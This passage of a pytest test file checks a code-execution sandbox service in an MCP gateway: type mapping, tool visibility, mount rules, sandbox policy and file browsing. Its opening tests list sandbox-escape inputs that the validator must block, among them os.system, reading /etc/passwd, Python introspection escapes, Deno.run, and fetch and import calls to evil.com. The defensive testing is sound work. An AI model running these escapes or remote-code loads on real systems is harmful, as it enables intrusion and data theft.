            "os.sys" + "tem('ls')",
            "subpro" + "cess.run(['ls'])",
            "open('/etc" + "/passwd')",
            "__subcla" + "sses__()",
            "__bas" + "es__",
            "__mr" + "o__",
            "__cla" + "ss__." + "mro()",
            "break" + "point()",
            "com" + "pile('code')",
            "globa" + "ls()",
            "getat" + "tr(obj, 'x')",
            "setat" + "tr(obj, 'x', 1)",
            "delat" + "tr(obj, 'x')",
            "va" + "rs()",
            "di" + "r()",
            "__built" + "ins__",
        ]
        for code in dangerous_codes:
            with pytest.raises(CodeExecutionSecurityError):
                svc._validate_code_safety(code=code, language="python", allow_raw_http=False, user_email=None, request_headers=None)

    def test_typescript_blocks_dangerous_patterns(self) -> None:
        svc = CodeExecutionService()
        svc._emit_security_event = lambda **_: None  # type: ignore[method-assign]

        dangerous_codes = [
            "ev" + "al('1+1')",
            "Deno.r" + "un",
            "Deno.Com" + "mand",
            "fet" + "ch('http://evil.com')",
            "from 'http" + "://evil.com'",
            "import('http" + "://evil.com')",
        ]
        for code in dangerous_codes:
            with pytest.raises(CodeExecutionSecurityError):
                svc._validate_code_safety(code=code, language="typescript", allow_raw_http=False, user_email=None, request_headers=None)

    def test_safe_code_passes(self) -> None:
        svc = CodeExecutionService()
        svc._emit_security_event = lambda **_: None  # type: ignore[method-assign]
        svc._validate_code_safety(code="x = 1 + 2\nprint(x)", language="python", allow_raw_http=False, user_email=None, request_headers=None)

    def test_allow_raw_http_relaxes_fetch(self) -> None:
        svc = CodeExecutionService()
        svc._emit_security_event = lambda **_: None  # type: ignore[method-assign]
        # With allow_raw_http, fetch should be allowed
        svc._validate_code_safety(
            code="fet" + "ch('http://example.com')",
            language="typescript",
            allow_raw_http=True,
            user_email=None,
            request_headers=None,
        )


# ===================================================================
# Schema type mapping
# ===================================================================


class TestSchemaTypeMapping:
    def test_typescript_string(self) -> None:
        svc = CodeExecutionService()
        assert svc._schema_to_typescript_type({"type": "string"}) == "string"

    def test_typescript_integer(self) -> None:
        svc = CodeExecutionService()
        assert svc._schema_to_typescript_type({"type": "integer"}) == "number"

    def test_typescript_number(self) -> None:
        svc = CodeExecutionService()
        assert svc._schema_to_typescript_type({"type": "number"}) == "number"

    def test_typescript_boolean(self) -> None:
        svc = CodeExecutionService()
        assert svc._schema_to_typescript_type({"type": "boolean"}) == "boolean"

    def test_typescript_array(self) -> None:
        svc = CodeExecutionService()
        assert svc._schema_to_typescript_type({"type": "array", "items": {"type": "string"}}) == "string[]"

    def test_typescript_object_no_props(self) -> None:
        svc = CodeExecutionService()
        assert svc._schema_to_typescript_type({"type": "object"}) == "Record<string, any>"

    def test_typescript_object_with_props(self) -> None:
        svc = CodeExecutionService()
        result = svc._schema_to_typescript_type({
            "type": "object",
            "properties": {"name": {"type": "string"}, "age": {"type": "integer"}},
            "required": ["name"],
        })
        assert "name: string;" in result
        assert "age?: number;" in result

    def test_typescript_enum(self) -> None:
        svc = CodeExecutionService()
        result = svc._schema_to_typescript_type({"enum": ["a", "b"]})
        assert '"a"' in result
        assert '"b"' in result

    def test_typescript_unknown(self) -> None:
        svc = CodeExecutionService()
        assert svc._schema_to_typescript_type({}) == "any"

    def test_python_string(self) -> None:
        svc = CodeExecutionService()
        assert svc._schema_to_python_type({"type": "string"}) == "str"

    def test_python_integer(self) -> None:
        svc = CodeExecutionService()
        assert svc._schema_to_python_type({"type": "integer"}) == "int"

    def test_python_number(self) -> None:
        svc = CodeExecutionService()
        assert svc._schema_to_python_type({"type": "number"}) == "float"

    def test_python_boolean(self) -> None:
        svc = CodeExecutionService()
        assert svc._schema_to_python_type({"type": "boolean"}) == "bool"

    def test_python_array(self) -> None:
        svc = CodeExecutionService()
        assert svc._schema_to_python_type({"type": "array", "items": {"type": "string"}}) == "List[str]"

    def test_python_object(self) -> None:
        svc = CodeExecutionService()
        assert svc._schema_to_python_type({"type": "object"}) == "Dict[str, Any]"

    def test_python_enum(self) -> None:
        svc = CodeExecutionService()
        result = svc._schema_to_python_type({"enum": ["x", "y"]})
        assert "Literal" in result

    def test_python_unknown(self) -> None:
        svc = CodeExecutionService()
        assert svc._schema_to_python_type({}) == "Any"


# ===================================================================
# Python identifier helpers
# ===================================================================


class TestPythonIdentifier:
    def test_normal(self) -> None:
        svc = CodeExecutionService()
        assert svc._python_identifier("hello_world") == "hello_world"

    def test_special_chars(self) -> None:
        svc = CodeExecutionService()
        assert svc._python_identifier("hello-world.v2") == "hello_world_v2"

    def test_digit_prefix(self) -> None:
        svc = CodeExecutionService()
        assert svc._python_identifier("123abc") == "_123abc"

    def test_empty(self) -> None:
        svc = CodeExecutionService()
        assert svc._python_identifier("") == "x"


# ===================================================================
# Tool server slug and file name
# ===================================================================


class TestToolServerSlugAndFileName:
    def test_server_slug_with_gateway(self) -> None:
        svc = CodeExecutionService()
        gateway = SimpleNamespace(slug="my-gateway", name="My Gateway")
        tool = SimpleNamespace(gateway=gateway)
        assert "my" in svc._tool_server_slug(tool)

    def test_server_slug_no_gateway(self) -> None:
        svc = CodeExecutionService()
        tool = SimpleNamespace(gateway=None)
        assert svc._tool_server_slug(tool) == "local"

    def test_tool_file_name_custom_slug(self) -> None:
        svc = CodeExecutionService()
        tool = SimpleNamespace(custom_name_slug="my-custom-tool", original_name="orig", name="name")
        result = svc._tool_file_name(tool)
        assert "_" in result or result.isalnum()

    def test_tool_file_name_original_name(self) -> None:
        svc = CodeExecutionService()
        tool = SimpleNamespace(custom_name_slug=None, original_name="get_data", name="name")
        result = svc._tool_file_name(tool)
        assert result == "get_data"

    def test_tool_file_name_fallback_to_name(self) -> None:
        svc = CodeExecutionService()
        tool = SimpleNamespace(custom_name_slug=None, original_name=None, name="my-tool")
        result = svc._tool_file_name(tool)
        assert "my_tool" == result


# ===================================================================
# _tool_result_to_python_obj
# ===================================================================


class TestToolResultToPythonObj:
    def test_dict_with_structured_content(self) -> None:
        svc = CodeExecutionService()
        result = {"structuredContent": {"key": "value"}}
        assert svc._tool_result_to_python_obj(result) == {"key": "value"}

    def test_dict_with_snake_case_structured_content(self) -> None:
        svc = CodeExecutionService()
        result = {"structured_content": {"key": "value"}}
        assert svc._tool_result_to_python_obj(result) == {"key": "value"}

    def test_dict_with_content_text_items(self) -> None:
        svc = CodeExecutionService()
        result = {"content": [{"text": '{"parsed": true}'}]}
        obj = svc._tool_result_to_python_obj(result)
        assert obj == {"parsed": True}

    def test_dict_with_content_non_json_text(self) -> None:
        svc = CodeExecutionService()
        result = {"content": [{"text": "plain text"}]}
        obj = svc._tool_result_to_python_obj(result)
        assert obj == {"text": "plain text"}

    def test_dict_with_empty_content(self) -> None:
        svc = CodeExecutionService()
        result = {"content": []}
        assert svc._tool_result_to_python_obj(result) == {}

    def test_dict_no_structured_or_content(self) -> None:
        svc = CodeExecutionService()
        result = {"other": "data"}
        assert svc._tool_result_to_python_obj(result) == {}

    def test_object_with_model_dump(self) -> None:
        svc = CodeExecutionService()
        obj = SimpleNamespace(model_dump=lambda by_alias=False, mode="python": {"structuredContent": {"x": 1}})
        assert svc._tool_result_to_python_obj(obj) == {"x": 1}

    def test_non_dict_non_model(self) -> None:
        svc = CodeExecutionService()
        assert svc._tool_result_to_python_obj("raw_string") == "raw_string"

    def test_content_item_with_text_attribute(self) -> None:
        svc = CodeExecutionService()
        item = SimpleNamespace(text="hello world")
        result = {"content": [item]}
        obj = svc._tool_result_to_python_obj(result)
        assert obj == {"text": "hello world"}

    def test_content_items_with_empty_text(self) -> None:
        svc = CodeExecutionService()
        result = {"content": [{"text": ""}, {"other": "no_text"}]}
        obj = svc._tool_result_to_python_obj(result)
        assert obj == {}


# ===================================================================
# build_meta_tools
# ===================================================================


class TestBuildMetaTools:
    def test_both_enabled(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr("mcpgateway.services.code_execution_service.settings.code_execution_shell_exec_enabled", True, raising=False)
        monkeypatch.setattr("mcpgateway.services.code_execution_service.settings.code_execution_fs_browse_enabled", True, raising=False)
        svc = CodeExecutionService()
        tools = svc.build_meta_tools("server-1")
        names = [t["name"] for t in tools]
        assert "shell_exec" in names
        assert "fs_browse" in names

    def test_shell_exec_only(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr("mcpgateway.services.code_execution_service.settings.code_execution_shell_exec_enabled", True, raising=False)
        monkeypatch.setattr("mcpgateway.services.code_execution_service.settings.code_execution_fs_browse_enabled", False, raising=False)
        svc = CodeExecutionService()
        tools = svc.build_meta_tools("server-1")
        names = [t["name"] for t in tools]
        assert "shell_exec" in names
        assert "fs_browse" not in names


# ===================================================================
# Security event emission
# ===================================================================


class TestSecurityEventEmission:
    def test_emit_with_headers(self) -> None:
        svc = CodeExecutionService()
        with patch.object(svc, "_emit_security_event", wraps=svc._emit_security_event):
            # Should not raise even if security logger fails
            svc._emit_security_event(
                user_email="test@example.com",
                description="test event",
                request_headers={"x-forwarded-for": "1.2.3.4", "user-agent": "test-agent"},
                threat_indicators={"pattern": "test"},
            )

    def test_emit_without_headers(self) -> None:
        svc = CodeExecutionService()
        svc._emit_security_event(
            user_email="test@example.com",
            description="test event",
            request_headers=None,
            threat_indicators={"pattern": "test"},
        )


# ===================================================================
# Tool visibility for scope
# ===================================================================


class TestToolVisibleForScope:
    def test_admin_bypass(self) -> None:
        svc = CodeExecutionService()
        tool = SimpleNamespace(visibility="private", owner_email="someone", team_id="team-1")
        assert svc._tool_visible_for_scope(tool, user_email=None, token_teams=None) is True

    def test_empty_teams_public_only(self) -> None:
        svc = CodeExecutionService()
        tool_public = SimpleNamespace(visibility="public", owner_email="x", team_id="t")
        tool_private = SimpleNamespace(visibility="team", owner_email="x", team_id="t")
        assert svc._tool_visible_for_scope(tool_public, user_email="u", token_teams=[]) is True
        assert svc._tool_visible_for_scope(tool_private, user_email="u", token_teams=[]) is False

    def test_public_always_visible(self) -> None:
        svc = CodeExecutionService()
        tool = SimpleNamespace(visibility="public", owner_email="x", team_id="t")
        assert svc._tool_visible_for_scope(tool, user_email="u", token_teams=["t2"]) is True

    def test_owner_can_see_private(self) -> None:
        svc = CodeExecutionService()
        tool = SimpleNamespace(visibility="private", owner_email="owner@test.com", team_id="t")
        assert svc._tool_visible_for_scope(tool, user_email="owner@test.com", token_teams=["other"]) is True

    def test_team_member_sees_team_tools(self) -> None:
        svc = CodeExecutionService()
        tool = SimpleNamespace(visibility="team", owner_email="x", team_id="t1")
        assert svc._tool_visible_for_scope(tool, user_email="u", token_teams=["t1"]) is True
        assert svc._tool_visible_for_scope(tool, user_email="u", token_teams=["t2"]) is False


# ===================================================================
# Mount rules
# ===================================================================


class TestMountRules:
    def test_include_tags_match(self) -> None:
        svc = CodeExecutionService()
        tool = SimpleNamespace(tags=["csv", "data"], name="my_tool", original_name="my_tool", gateway=None)
        rules = {"include_tags": ["csv"]}
        assert svc._tool_matches_mount_rules(tool, rules) is True

    def test_include_tags_no_match(self) -> None:
        svc = CodeExecutionService()
        tool = SimpleNamespace(tags=["data"], name="my_tool", original_name="my_tool", gateway=None)
        rules = {"include_tags": ["csv"]}
        assert svc._tool_matches_mount_rules(tool, rules) is False

    def test_exclude_tags(self) -> None:
        svc = CodeExecutionService()
        tool = SimpleNamespace(tags=["deprecated"], name="my_tool", original_name="my_tool", gateway=None)
        rules = {"exclude_tags": ["deprecated"]}
        assert svc._tool_matches_mount_rules(tool, rules) is False

    def test_include_tools(self) -> None:
        svc = CodeExecutionService()
        tool = SimpleNamespace(tags=[], name="allowed_tool", original_name="allowed_tool", gateway=None)
        rules = {"include_tools": ["allowed_tool"]}
        assert svc._tool_matches_mount_rules(tool, rules) is True

    def test_exclude_tools(self) -> None:
        svc = CodeExecutionService()
        tool = SimpleNamespace(tags=[], name="blocked_tool", original_name="blocked_tool", gateway=None)
        rules = {"exclude_tools": ["blocked_tool"]}
        assert svc._tool_matches_mount_rules(tool, rules) is False

    def test_include_servers(self) -> None:
        svc = CodeExecutionService()
        gateway = SimpleNamespace(slug="my-server", name="My Server")
        tool = SimpleNamespace(tags=[], name="t", original_name="t", gateway=gateway)
        rules = {"include_servers": ["my-server"]}
        assert svc._tool_matches_mount_rules(tool, rules) is True

    def test_exclude_servers(self) -> None:
        svc = CodeExecutionService()
        gateway = SimpleNamespace(slug="blocked-server", name="Blocked Server")
        tool = SimpleNamespace(tags=[], name="t", original_name="t", gateway=gateway)
        rules = {"exclude_servers": ["blocked-server"]}
        assert svc._tool_matches_mount_rules(tool, rules) is False

    def test_no_rules_allows_all(self) -> None:
        svc = CodeExecutionService()
        tool = SimpleNamespace(tags=[], name="t", original_name="t", gateway=None)
        assert svc._tool_matches_mount_rules(tool, {}) is True

    def test_server_mount_rules_normalization(self) -> None:
        svc = CodeExecutionService()
        server = SimpleNamespace(mount_rules={"include_tags": ["csv"]})
        result = svc._server_mount_rules(server)
        assert result == {"include_tags": ["csv"]}

    def test_server_mount_rules_none(self) -> None:
        svc = CodeExecutionService()
        server = SimpleNamespace(mount_rules=None)
        result = svc._server_mount_rules(server)
        assert result == {}

    def test_server_mount_rules_model_dump(self) -> None:
        svc = CodeExecutionService()
        mount = SimpleNamespace(model_dump=lambda: {"include_tags": ["x"]})
        server = SimpleNamespace(mount_rules=mount)
        result = svc._server_mount_rules(server)
        assert result == {"include_tags": ["x"]}


# ===================================================================
# Sandbox policy normalization
# ===================================================================


class TestSandboxPolicy:
    def test_flat_keys_take_precedence(self) -> None:
        svc = CodeExecutionService()
        server = SimpleNamespace(sandbox_policy={"max_execution_time_ms": 5000, "runtime": "python"}, tokenization=None)
        policy = svc._server_sandbox_policy(server)
        assert policy["max_execution_time_ms"] == 5000
        assert policy["runtime"] == "python"

    def test_nested_limits(self) -> None:
        svc = CodeExecutionService()
        server = SimpleNamespace(sandbox_policy={"limits": {"max_memory_mb": 128}}, tokenization=None)
        policy = svc._server_sandbox_policy(server)
        assert policy["limits"]["max_memory_mb"] == 128

    def test_invalid_runtime_falls_back(self) -> None:
        svc = CodeExecutionService()
        server = SimpleNamespace(sandbox_policy={"runtime": "invalid_runtime"}, tokenization=None)
        policy = svc._server_sandbox_policy(server)
        assert policy["runtime"] in {"deno", "python"}

    def test_runtime_requirements_language_fallback(self) -> None:
        svc = CodeExecutionService()
        server = SimpleNamespace(
            sandbox_policy={"runtime": "invalid", "runtime_requirements": {"language": "python"}},
            tokenization=None,
        )
        policy = svc._server_sandbox_policy(server)
        assert policy["runtime"] == "python"

    def test_none_sandbox_policy(self) -> None:
        svc = CodeExecutionService()
        server = SimpleNamespace(sandbox_policy=None, tokenization=None)
        policy = svc._server_sandbox_policy(server)
        assert "runtime" in policy
        assert "permissions" in policy

    def test_bool_limit_ignored(self) -> None:
        svc = CodeExecutionService()
        server = SimpleNamespace(sandbox_policy={"limits": {"max_memory_mb": True}}, tokenization=None)
        policy = svc._server_sandbox_policy(server)
        # Bool should be replaced with default
        assert isinstance(policy["limits"]["max_memory_mb"], int)
        assert policy["limits"]["max_memory_mb"] != True  # noqa: E712

    def test_unparseable_limit_falls_back(self) -> None:
        svc = CodeExecutionService()
        server = SimpleNamespace(sandbox_policy={"limits": {"max_memory_mb": "not_a_number"}}, tokenization=None)
        policy = svc._server_sandbox_policy(server)
        assert isinstance(policy["limits"]["max_memory_mb"], int)

    def test_model_dump_policy(self) -> None:
        svc = CodeExecutionService()
        raw = SimpleNamespace(model_dump=lambda: {"runtime": "python"})
        server = SimpleNamespace(sandbox_policy=raw, tokenization=None)
        policy = svc._server_sandbox_policy(server)
        assert policy["runtime"] == "python"


# ===================================================================
# Tokenization policy
# ===================================================================


class TestTokenizationPolicy:
    def test_default_policy(self) -> None:
        svc = CodeExecutionService()
        server = SimpleNamespace(tokenization=None)
        policy = svc._server_tokenization_policy(server)
        assert "types" in policy
        assert "enabled" in policy

    def test_override_policy(self) -> None:
        svc = CodeExecutionService()
        server = SimpleNamespace(tokenization={"enabled": True, "types": ["email"]})
        policy = svc._server_tokenization_policy(server)
        assert policy["enabled"] is True
        assert policy["types"] == ["email"]

    def test_model_dump_tokenization(self) -> None:
        svc = CodeExecutionService()
        raw = SimpleNamespace(model_dump=lambda: {"enabled": True})
        server = SimpleNamespace(tokenization=raw)
        policy = svc._server_tokenization_policy(server)
        assert policy["enabled"] is True


# ===================================================================
# Skill visibility for scope
# ===================================================================


class TestSkillVisibleForScope:
    def test_admin_bypass(self) -> None:
        svc = CodeExecutionService()
        skill = SimpleNamespace(team_id="t1", owner_email="x@x.com")
        assert svc._skill_visible_for_scope(skill=skill, user_email="u", token_teams=None, skills_scope="") is True

    def test_user_scope_match(self) -> None:
        svc = CodeExecutionService()
        skill = SimpleNamespace(team_id="t1", owner_email="target@x.com")
        assert svc._skill_visible_for_scope(skill=skill, user_email="target@x.com", token_teams=["t1"], skills_scope="user:target@x.com") is True

    def test_user_scope_no_match(self) -> None:
        svc = CodeExecutionService()
        skill = SimpleNamespace(team_id="t1", owner_email="other@x.com")
        assert svc._skill_visible_for_scope(skill=skill, user_email="me@x.com", token_teams=["t1"], skills_scope="user:target@x.com") is False

    def test_team_scope_match(self) -> None:
        svc = CodeExecutionService()
        skill = SimpleNamespace(team_id="t1", owner_email="x@x.com")
        assert svc._skill_visible_for_scope(skill=skill, user_email="u", token_teams=["t1"], skills_scope="team:t1") is True

    def test_team_scope_no_match(self) -> None:
        svc = CodeExecutionService()
        skill = SimpleNamespace(team_id="t1", owner_email="x@x.com")
        assert svc._skill_visible_for_scope(skill=skill, user_email="u", token_teams=["t2"], skills_scope="team:t1") is False

    def test_empty_teams_owner_match(self) -> None:
        svc = CodeExecutionService()
        skill = SimpleNamespace(team_id="t1", owner_email="owner@x.com")
        assert svc._skill_visible_for_scope(skill=skill, user_email="owner@x.com", token_teams=[], skills_scope="") is True

    def test_empty_teams_non_owner(self) -> None:
        svc = CodeExecutionService()
        skill = SimpleNamespace(team_id="t1", owner_email="other@x.com")
        assert svc._skill_visible_for_scope(skill=skill, user_email="me@x.com", token_teams=[], skills_scope="") is False

    def test_skill_team_not_in_token_teams(self) -> None:
        svc = CodeExecutionService()
        skill = SimpleNamespace(team_id="t99", owner_email="x@x.com")
        # team_id not in token_teams and not owner
        assert svc._skill_visible_for_scope(skill=skill, user_email="u", token_teams=["t1", "t2"], skills_scope="") is False

    def test_skill_team_not_in_token_teams_but_owner(self) -> None:
        svc = CodeExecutionService()
        skill = SimpleNamespace(team_id="t99", owner_email="owner@x.com")
        assert svc._skill_visible_for_scope(skill=skill, user_email="owner@x.com", token_teams=["t1"], skills_scope="") is True


# ===================================================================
# Wipe and recreate, percentile, search index
# ===================================================================


class TestMiscHelpers:
    def test_wipe_and_recreate_directory(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        target = tmp_path / "wipe_me"
        target.mkdir()
        (target / "old_file.txt").write_text("old", encoding="utf-8")
        svc._wipe_and_recreate_directory(target)
        assert target.exists()
        assert list(target.iterdir()) == []

    def test_percentile_empty(self) -> None:
        svc = CodeExecutionService()
        assert svc._percentile([], 95) == 0.0

    def test_percentile_single(self) -> None:
        svc = CodeExecutionService()
        assert svc._percentile([42], 50) == 42.0

    def test_percentile_multiple(self) -> None:
        svc = CodeExecutionService()
        values = list(range(1, 101))
        p50 = svc._percentile(values, 50)
        assert 49 < p50 < 51

        p95 = svc._percentile(values, 95)
        assert 94 < p95 < 96

    def test_build_search_index(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        subdir = session.tools_dir / "server1"
        subdir.mkdir()
        (subdir / "tool.py").write_text("def my_function(): pass", encoding="utf-8")
        svc._build_search_index(session.tools_dir)
        index = session.tools_dir / ".search_index"
        assert index.exists()
        content = index.read_text(encoding="utf-8")
        assert "my_function" in content

    def test_write_runtime_helpers(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        svc._write_runtime_helpers(session.tools_dir)
        assert (session.tools_dir / "_runtime.ts").exists()
        assert (session.tools_dir / "_runtime.py").exists()


# ===================================================================
# Normalize runtime alias
# ===================================================================


class TestNormalizeRuntimeAlias:
    def test_basic(self) -> None:
        svc = CodeExecutionService()
        assert svc._normalize_runtime_alias("my-server") == "my_server"

    def test_mixed_case(self) -> None:
        svc = CodeExecutionService()
        assert svc._normalize_runtime_alias("MyServer") == "myserver"

    def test_special_chars(self) -> None:
        svc = CodeExecutionService()
        assert svc._normalize_runtime_alias("a.b/c") == "a_b_c"

    def test_empty(self) -> None:
        svc = CodeExecutionService()
        assert svc._normalize_runtime_alias("") == ""


# ===================================================================
# Destroy session
# ===================================================================


class TestDestroySession:
    @pytest.mark.asyncio
    async def test_destroy_cleans_up(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        (session.scratch_dir / "data.txt").write_text("temp", encoding="utf-8")
        await svc._destroy_session(session)
        assert not session.root_dir.exists()


# ===================================================================
# Python tools namespace
# ===================================================================


class TestBuildPythonToolsNamespace:
    @pytest.mark.asyncio
    async def test_namespace_resolves_tool(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        session.mounted_tools["gateway_sep_get_doc"] = {
            "server_slug": "my-server",
            "stub_basename": "get_doc",
            "python_tool_alias": "get_doc",
        }

        captured: Dict[str, Any] = {}

        async def bridge(a: str, b: Optional[Any] = None, c: Optional[Any] = None) -> Any:
            captured["tool"] = a
            captured["args"] = b
            return {"ok": True}

        ns = svc._build_python_tools_namespace(session=session, bridge=bridge)
        result = await ns.my_server.get_doc({"id": "123"})
        assert result == {"ok": True}
        assert captured["tool"] == "gateway_sep_get_doc"


# ===================================================================
# In-process Python execution
# ===================================================================


class TestInprocessPythonExecution:
    @pytest.mark.asyncio
    async def test_simple_code(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        result = await svc._execute_python_inprocess(
            code="x = 1 + 2\nprint(x)",
            session=session,
            timeout_ms=5000,
            invoke_tool=AsyncMock(),
            policy=_policy(),
            request_headers=None,
            user_email=None,
        )
        assert "3" in result["output"]

    @pytest.mark.asyncio
    async def test_return_value_serialized(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        result = await svc._execute_python_inprocess(
            code='return {"answer": 42}',
            session=session,
            timeout_ms=5000,
            invoke_tool=AsyncMock(),
            policy=_policy(),
            request_headers=None,
            user_email=None,
        )
        assert "42" in result["output"]

    @pytest.mark.asyncio
    async def test_timeout_raises(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        # Mock asyncio.wait_for to simulate a timeout. A real sync busy-loop
        # (while True: pass) blocks the event loop and prevents cancellation,
        # so we test the timeout-handling path via mock instead.
        with patch("asyncio.wait_for", side_effect=TimeoutError("timed out")):
            with pytest.raises(CodeExecutionError, match="timed out"):
                await svc._execute_python_inprocess(
                    code="x = 1",
                    session=session,
                    timeout_ms=100,
                    invoke_tool=AsyncMock(),
                    policy=_policy(),
                    request_headers=None,
                    user_email=None,
                )

    @pytest.mark.asyncio
    async def test_read_file_from_inprocess(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        (session.tools_dir / "data.txt").write_text("hello from file", encoding="utf-8")
        result = await svc._execute_python_inprocess(
            code='content = read_file("/tools/data.txt")\nprint(content)',
            session=session,
            timeout_ms=5000,
            invoke_tool=AsyncMock(),
            policy=_policy(),
            request_headers=None,
            user_email=None,
        )
        assert "hello from file" in result["output"]

    @pytest.mark.asyncio
    async def test_write_file_from_inprocess(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        result = await svc._execute_python_inprocess(
            code='write_file("/scratch/out.txt", "written")\nprint("done")',
            session=session,
            timeout_ms=5000,
            invoke_tool=AsyncMock(),
            policy=_policy(),
            request_headers=None,
            user_email=None,
        )
        assert "done" in result["output"]
        assert (session.scratch_dir / "out.txt").read_text(encoding="utf-8") == "written"

    @pytest.mark.asyncio
    async def test_list_dir_from_inprocess(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        (session.tools_dir / "a.py").write_text("a", encoding="utf-8")
        result = await svc._execute_python_inprocess(
            code='files = list_dir("/tools")\nprint(files)',
            session=session,
            timeout_ms=5000,
            invoke_tool=AsyncMock(),
            policy=_policy(),
            request_headers=None,
            user_email=None,
        )
        assert "a.py" in result["output"]


# ===================================================================
# fs_browse edge cases
# ===================================================================


class TestFsBrowseEdgeCases:
    @pytest.mark.asyncio
    async def test_fs_browse_disabled(self) -> None:
        svc = CodeExecutionService()
        svc._fs_browse_enabled = False
        with pytest.raises(CodeExecutionError, match="disabled"):
            await svc.fs_browse(
                db=SimpleNamespace(),
                server=SimpleNamespace(stub_language="python"),
                path="/tools",
                include_hidden=False,
                max_entries=10,
                user_email="u",
                token_teams=None,
            )

    @pytest.mark.asyncio
    async def test_fs_browse_invalid_max_entries(self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
        monkeypatch.setattr("mcpgateway.services.code_execution_service.settings.code_execution_fs_browse_enabled", True, raising=False)
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        (session.tools_dir / "file.txt").write_text("x", encoding="utf-8")

        async def _fake(**_kwargs: Any) -> CodeExecutionSession:
            return session

        svc._get_or_create_session = _fake  # type: ignore[method-assign]
        result = await svc.fs_browse(
            db=SimpleNamespace(),
            server=SimpleNamespace(stub_language="python"),
            path="/tools",
            include_hidden=False,
            max_entries="not_a_number",
            user_email="u",
            token_teams=None,
        )
        assert "entries" in result

    @pytest.mark.asyncio
    async def test_fs_browse_bool_max_entries(self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
        monkeypatch.setattr("mcpgateway.services.code_execution_service.settings.code_execution_fs_browse_enabled", True, raising=False)
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        (session.tools_dir / "file.txt").write_text("x", encoding="utf-8")

        async def _fake(**_kwargs: Any) -> CodeExecutionSession:
            return session

        svc._get_or_create_session = _fake  # type: ignore[method-assign]
        result = await svc.fs_browse(
            db=SimpleNamespace(),
            server=SimpleNamespace(stub_language="python"),
            path="/tools",
            include_hidden=False,
            max_entries=True,
            user_email="u",
            token_teams=None,
        )
        assert "entries" in result

    @pytest.mark.asyncio
    async def test_fs_browse_file_path(self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
        monkeypatch.setattr("mcpgateway.services.code_execution_service.settings.code_execution_fs_browse_enabled", True, raising=False)
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        (session.tools_dir / "file.txt").write_text("contents", encoding="utf-8")

        async def _fake(**_kwargs: Any) -> CodeExecutionSession:
            return session

        svc._get_or_create_session = _fake  # type: ignore[method-assign]
        result = await svc.fs_browse(
            db=SimpleNamespace(),
            server=SimpleNamespace(stub_language="python"),
            path="/tools/file.txt",
            include_hidden=False,
            max_entries=100,
            user_email="u",
            token_teams=None,
        )
        assert len(result["entries"]) == 1
        assert result["entries"][0]["type"] == "file"

    @pytest.mark.asyncio
    async def test_fs_browse_outside_vfs(self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
        monkeypatch.setattr("mcpgateway.services.code_execution_service.settings.code_execution_fs_browse_enabled", True, raising=False)
        svc = CodeExecutionService()
        session = _make_session(tmp_path)

        async def _fake(**_kwargs: Any) -> CodeExecutionSession:
            return session

        svc._get_or_create_session = _fake  # type: ignore[method-assign]
        with pytest.raises(CodeExecutionSecurityError, match="outside"):
            await svc.fs_browse(
                db=SimpleNamespace(),
                server=SimpleNamespace(stub_language="python"),
                path="/unknown/path",
                include_hidden=False,
                max_entries=100,
                user_email="u",
                token_teams=None,
            )

    @pytest.mark.asyncio
    async def test_fs_browse_nonexistent_path(self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
        monkeypatch.setattr("mcpgateway.services.code_execution_service.settings.code_execution_fs_browse_enabled", True, raising=False)
        svc = CodeExecutionService()
        session = _make_session(tmp_path)

        async def _fake(**_kwargs: Any) -> CodeExecutionSession:
            return session

        svc._get_or_create_session = _fake  # type: ignore[method-assign]
        with pytest.raises(CodeExecutionError, match="not found"):
            await svc.fs_browse(
                db=SimpleNamespace(),
                server=SimpleNamespace(stub_language="python"),
                path="/tools/nonexistent",
                include_hidden=False,
                max_entries=100,
                user_email="u",
                token_teams=None,
            )

    @pytest.mark.asyncio
    async def test_fs_browse_hidden_files_excluded_by_default(self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
        monkeypatch.setattr("mcpgateway.services.code_execution_service.settings.code_execution_fs_browse_enabled", True, raising=False)
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        (session.tools_dir / ".hidden").write_text("h", encoding="utf-8")
        (session.tools_dir / "visible.txt").write_text("v", encoding="utf-8")

        async def _fake(**_kwargs: Any) -> CodeExecutionSession:
            return session

        svc._get_or_create_session = _fake  # type: ignore[method-assign]
        result = await svc.fs_browse(
            db=SimpleNamespace(),
            server=SimpleNamespace(stub_language="python"),
            path="/tools",
            include_hidden=False,
            max_entries=100,
            user_email="u",
            token_teams=None,
        )
        names = [e["name"] for e in result["entries"]]
        assert ".hidden" not in names
        assert "visible.txt" in names


# ===================================================================
# Resolve runtime tool name
# ===================================================================


class TestResolveRuntimeToolName:
    def test_direct_index_match(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        session.runtime_tool_index[("my_server", "get_doc")] = "gateway_sep_get_doc"
        result = svc._resolve_runtime_tool_name(session, "my-server", "get_doc")
        assert result == "gateway_sep_get_doc"

    def test_canonical_name_match(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        session.mounted_tools["my_canonical_tool"] = {}
